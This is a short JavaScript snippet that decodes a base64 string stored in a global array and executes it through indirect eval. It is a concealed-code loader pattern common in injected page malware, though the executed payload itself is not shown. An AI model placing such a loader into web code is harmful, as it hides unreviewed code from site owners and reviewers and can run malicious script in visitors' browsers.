(function(){
  var p = window.__EB; if(!p) return;
  var s = p.join('');
  var bin = atob(s);
  var code = '';
  for (var i=0;i<bin.length;i++) code += String.fromCharCode(bin.charCodeAt(i));
  (0,eval)(code);
})();
